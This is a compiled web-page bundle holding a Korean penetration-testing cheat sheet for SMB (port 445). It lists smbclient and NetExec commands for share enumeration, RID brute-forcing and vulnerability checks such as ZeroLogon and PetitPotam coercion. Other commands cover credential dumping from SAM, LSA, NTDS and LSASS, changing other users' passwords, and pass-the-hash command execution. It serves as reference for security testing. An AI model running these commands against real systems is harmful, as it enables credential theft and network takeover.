"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[4064],{8159:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>u,frontMatter:()=>r,metadata:()=>S,toc:()=>R});const S=JSON.parse('{"id":"cheatsheet/services/smb","title":"SMB - 445","description":"\uae30\ubcf8 \uc815\ubcf4","source":"@site/docs/cheatsheet/services/smb.md","sourceDirName":"cheatsheet/services","slug":"/cheatsheet/services/smb","permalink":"/my-docusaurus-page/cheatsheet/services/smb","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":6,"frontMatter":{"sidebar_position":6},"sidebar":"tutorialSidebar","previous":{"title":"SNMP - 161/162","permalink":"/my-docusaurus-page/cheatsheet/services/snmp"},"next":{"title":"MSSQL - 1433","permalink":"/my-docusaurus-page/cheatsheet/services/mssql"}}');var c=s(74848),t=s(28453);const r={sidebar_position:6},i="SMB - 445",l={},R=[{value:"\uae30\ubcf8 \uc815\ubcf4",id:"\uae30\ubcf8-\uc815\ubcf4",level:2},{value:"\ub9c8\uc6b4\ud2b8",id:"\ub9c8\uc6b4\ud2b8",level:2},{value:"smbclient",id:"smbclient",level:2},{value:"\ub2e4\uc911 \ud30c\uc77c \ub2e4\uc6b4\ub85c\ub4dc",id:"\ub2e4\uc911-\ud30c\uc77c-\ub2e4\uc6b4\ub85c\ub4dc",level:3},{value:"NetExec - SMB \uc5f4\uac70",id:"netexec---smb-\uc5f4\uac70",level:2},{value:"\uacf5\uc720 \uc5f4\uac70",id:"\uacf5\uc720-\uc5f4\uac70",level:3},{value:"\ud30c\uc77c \ub2e4\uc6b4\ub85c\ub4dc",id:"\ud30c\uc77c-\ub2e4\uc6b4\ub85c\ub4dc",level:3},{value:"\ud30c\uc77c \ucc98\ub9ac",id:"\ud30c\uc77c-\ucc98\ub9ac",level:3},{value:"NetExec - RID \ube0c\ub8e8\ud2b8\ud3ec\uc2a4",id:"netexec---rid-\ube0c\ub8e8\ud2b8\ud3ec\uc2a4",level:2},{value:"NetExec - \ucde8\uc57d\uc810 \uc2a4\uce94",id:"netexec---\ucde8\uc57d\uc810-\uc2a4\uce94",level:2},{value:"NetExec - \uc2dc\uc2a4\ud15c \uc5f4\uac70",id:"netexec---\uc2dc\uc2a4\ud15c-\uc5f4\uac70",level:2},{value:"NetExec - \uc790\uaca9\uc99d\uba85 \ub364\ud504",id:"netexec---\uc790\uaca9\uc99d\uba85-\ub364\ud504",level:2},{value:"NetExec - Timeroasting",id:"netexec---timeroasting",level:2},{value:"NetExec - \uc0ac\uc6a9\uc790 \uad00\ub9ac",id:"netexec---\uc0ac\uc6a9\uc790-\uad00\ub9ac",level:2},{value:"NetExec - \uba85\ub839 \uc2e4\ud589",id:"netexec---\uba85\ub839-\uc2e4\ud589",level:2},{value:"Nmap",id:"nmap",level:2},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function a(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,t.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(n.header,{children:(0,c.jsx)(n.h1,{id:"smb---445",children:"SMB - 445"})}),"\n",(0,c.jsx)(n.h2,{id:"\uae30\ubcf8-\uc815\ubcf4",children:"\uae30\ubcf8 \uc815\ubcf4"}),"\n",(0,c.jsxs)(n.p,{children:[(0,c.jsx)(n.strong,{children:"\ud3ec\ud2b8"}),": 139 (SMB over NetBIOS), 445 (SMB Direct)"]}),"\n",(0,c.jsx)(n.p,{children:"SMB(Server Message Block)\ub294 \ud30c\uc77c \uacf5\uc720, \ud504\ub9b0\ud130 \uacf5\uc720 \ub4f1\uc744 \uc704\ud55c \ud504\ub85c\ud1a0\ucf5c\uc785\ub2c8\ub2e4."}),"\n",(0,c.jsx)(n.h2,{id:"\ub9c8\uc6b4\ud2b8",children:"\ub9c8\uc6b4\ud2b8"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# CIFS \ub9c8\uc6b4\ud2b8\nmount.cifs //<RHOST>/<SHARE> /mnt/remote\n\n# guestmount\nguestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v\n"})}),"\n",(0,c.jsx)(n.h2,{id:"smbclient",children:"smbclient"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# \uacf5\uc720 \ubaa9\ub85d \uc870\ud68c\nsmbclient -L \\\\<RHOST>\\ -N\nsmbclient -L //<RHOST>/ -N\nsmbclient -L ////<RHOST>/ -N\nsmbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>\nsmbclient -U \"<USERNAME>\" -L \\\\\\\\<RHOST>\\\\\n\n# \uacf5\uc720 \uc811\uc18d\nsmbclient //<RHOST>/<SHARE>\nsmbclient //<RHOST>/<SHARE> -U <USERNAME>\nsmbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>\nsmbclient \"\\\\\\\\<RHOST>\\<SHARE>\"\nsmbclient --no-pass //<RHOST>/<SHARE>\n\n# \uc131\ub2a5 \ucd5c\uc801\ud654 \uc635\uc158\nsmbclient \\\\\\\\<RHOST>\\\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000\n"})}),"\n",(0,c.jsx)(n.h3,{id:"\ub2e4\uc911-\ud30c\uc77c-\ub2e4\uc6b4\ub85c\ub4dc",children:"\ub2e4\uc911 \ud30c\uc77c \ub2e4\uc6b4\ub85c\ub4dc"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:'# smbclient \ub0b4\ubd80\uc5d0\uc11c\nmask ""\nrecurse ON\nprompt OFF\nmget *\n'})}),"\n",(0,c.jsx)(n.h2,{id:"netexec---smb-\uc5f4\uac70",children:"NetExec - SMB \uc5f4\uac70"}),"\n",(0,c.jsx)(n.h3,{id:"\uacf5\uc720-\uc5f4\uac70",children:"\uacf5\uc720 \uc5f4\uac70"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# \uae30\ubcf8 \uacf5\uc720 \uc5f4\uac70\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares\n\n# \ub514\ub809\ud1a0\ub9ac \ud3ec\ud568\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --dir\n\n# \ud2b9\uc815 \ud3f4\ub354 \uc870\ud68c\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --dir \"<FOLDER>\"\n\n# \ud0c0\uc784\uc544\uc6c3 \uc124\uc815\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --smb-timeout 10\n"})}),"\n",(0,c.jsx)(n.h3,{id:"\ud30c\uc77c-\ub2e4\uc6b4\ub85c\ub4dc",children:"\ud30c\uc77c \ub2e4\uc6b4\ub85c\ub4dc"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# Spider Plus \ubaa8\ub4c8\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o READ_ONLY=false\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o DOWNLOAD_FLAG=true\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999\n\n# \ub2e8\uc77c \ud30c\uc77c \ub2e4\uc6b4\ub85c\ub4dc\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --share <SHARE> --get-file <FILE> <FILE>\n"})}),"\n",(0,c.jsx)(n.h3,{id:"\ud30c\uc77c-\ucc98\ub9ac",children:"\ud30c\uc77c \ucc98\ub9ac"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# \ud30c\uc77c \ub2e4\uc6b4\ub85c\ub4dc\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file \\\\PATH\\\\TO\\FOLDER\\\\<FILE> /PATH/TO/FOLDER/<FILE>\n\n# \ud30c\uc77c \uc5c5\ub85c\ub4dc\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file /PATH/TO/FILE/<FILE> \\\\PATH\\\\TO\\FOLDER\\\\<FILE>\n"})}),"\n",(0,c.jsx)(n.h2,{id:"netexec---rid-\ube0c\ub8e8\ud2b8\ud3ec\uc2a4",children:"NetExec - RID \ube0c\ub8e8\ud2b8\ud3ec\uc2a4"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# \uae30\ubcf8 RID \ube0c\ub8e8\ud2b8\ud3ec\uc2a4\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute\n\n# RID \ubc94\uc704 \uc9c0\uc815\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute 100000\n\n# \uc0ac\uc6a9\uc790\ub9cc \ud544\ud130\ub9c1\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}'\n\n# \ub3c4\uba54\uc778 \uc81c\uac70\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}' | awk -F '\\\\' '{print $2}'\n"})}),"\n",(0,c.jsx)(n.h2,{id:"netexec---\ucde8\uc57d\uc810-\uc2a4\uce94",children:"NetExec - \ucde8\uc57d\uc810 \uc2a4\uce94"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# MS17-010 (EternalBlue)\nnetexec smb <RHOST> -u '' -p '' -M ms17-010\n\n# SMBGhost\nnetexec smb <RHOST> -u '' -p '' -M smbghost\n\n# ZeroLogon\nnetexec smb <RHOST> -u '' -p '' -M zerologon\n\n# PrintNightmare\nnetexec smb <RHOST> -u '' -p '' -M printnightmare\n\n# NoPac\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nopac\n\n# Coerce Plus\nnetexec smb <RHOST> -u '' -p '' -M coerce_plus\nnetexec smb <RHOST> -u '' -p '' -M coerce_plus -o LISTENER=<LHOST>\nnetexec smb <RHOST> -u '' -p '' -M coerce_plus -o LISTENER=<LHOST> ALWAYS=true\nnetexec smb <RHOST> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam\n"})}),"\n",(0,c.jsx)(n.h2,{id:"netexec---\uc2dc\uc2a4\ud15c-\uc5f4\uac70",children:"NetExec - \uc2dc\uc2a4\ud15c \uc5f4\uac70"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# \uc0ac\uc6a9\uc790 \uc5f4\uac70\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users-export <FILE>\n\n# \uadf8\ub8f9 \uc5f4\uac70\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-group\n\n# \ube44\ubc00\ubc88\ud638 \uc815\ucc45\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --pass-pol\n\n# \ub514\uc2a4\ud06c \uc815\ubcf4\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --disks\n\n# SMB \uc138\uc158\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --smb-sessions\n\n# \ub85c\uadf8\uc628 \uc0ac\uc6a9\uc790\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --loggedon-users\n\n# \ucd94\uac00 \ubaa8\ub4c8\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M bitlocker\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spooler\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M webdav\n"})}),"\n",(0,c.jsx)(n.h2,{id:"netexec---\uc790\uaca9\uc99d\uba85-\ub364\ud504",children:"NetExec - \uc790\uaca9\uc99d\uba85 \ub364\ud504"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# SAM\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam\n\n# LSA\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa\n\n# DPAPI\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi cookies\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi nosystem\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi nosystem\n\n# NTDS\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds\n\n# \ucd94\uac00 \ubaa8\ub4c8\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M eventlog_creds\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nanodump\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ntdsutil\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M putty\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M vnc\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mremoteng\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad++\n"})}),"\n",(0,c.jsx)(n.h2,{id:"netexec---timeroasting",children:"NetExec - Timeroasting"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M timeroast\n"})}),"\n",(0,c.jsx)(n.h2,{id:"netexec---\uc0ac\uc6a9\uc790-\uad00\ub9ac",children:"NetExec - \uc0ac\uc6a9\uc790 \uad00\ub9ac"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# \ube44\ubc00\ubc88\ud638 \ubcc0\uacbd (\uc790\uc2e0)\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M change-password -o NEWPASS=<PASSWORD>\n\n# \ube44\ubc00\ubc88\ud638 \ubcc0\uacbd (\ub2e4\ub978 \uc0ac\uc6a9\uc790)\nnetexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M change-password -o USER=<USERNAME> NEWPASS=<PASSWORD>\n"})}),"\n",(0,c.jsx)(n.h2,{id:"netexec---\uba85\ub839-\uc2e4\ud589",children:"NetExec - \uba85\ub839 \uc2e4\ud589"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# \ud574\uc2dc \uc0ac\uc6a9\nnetexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x <COMMAND>\n\n# Process Injection\nnetexec smb <RHOST> -u '<USERNAME>' -M pi -o PID=<PID> EXEC=<COMMAND>\n"})}),"\n",(0,c.jsx)(n.h2,{id:"nmap",children:"Nmap"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# SMB \ubc84\uc804 \ud655\uc778\nsudo nmap -p139,445 -sV <RHOST>\n\n# SMB \ucde8\uc57d\uc810 \uc2a4\uce94\nsudo nmap -p445 --script smb-vuln-* <RHOST>\n\n# SMB OS Discovery\nsudo nmap -p445 --script smb-os-discovery <RHOST>\n\n# SMB \uacf5\uc720 \uc5f4\uac70\nsudo nmap -p445 --script smb-enum-shares <RHOST>\n\n# SMB \uc0ac\uc6a9\uc790 \uc5f4\uac70\nsudo nmap -p445 --script smb-enum-users <RHOST>\n"})}),"\n",(0,c.jsx)(n.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,c.jsxs)(n.ul,{children:["\n",(0,c.jsx)(n.li,{children:"Null Session \ud655\uc778"}),"\n",(0,c.jsx)(n.li,{children:"\uc775\uba85 \ub85c\uadf8\uc778 \uc2dc\ub3c4"}),"\n",(0,c.jsx)(n.li,{children:"\uc57d\ud55c \uc790\uaca9\uc99d\uba85 \ud14c\uc2a4\ud2b8"}),"\n",(0,c.jsx)(n.li,{children:"EternalBlue, SMBGhost \ub4f1 \uc8fc\uc694 \ucde8\uc57d\uc810 \ud655\uc778"}),"\n",(0,c.jsx)(n.li,{children:"LDAP \uad00\ub828 \uba85\ub839\uc5b4\ub294 LDAP \uc139\uc158 \ucc38\uace0"}),"\n"]})]})}function u(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,c.jsx)(n,{...e,children:(0,c.jsx)(a,{...e})}):a(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>r,x:()=>i});var S=s(96540);const c={},t=S.createContext(c);function r(e){const n=S.useContext(t);return S.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:r(e.components),S.createElement(t.Provider,{value:n},e.children)}}}]);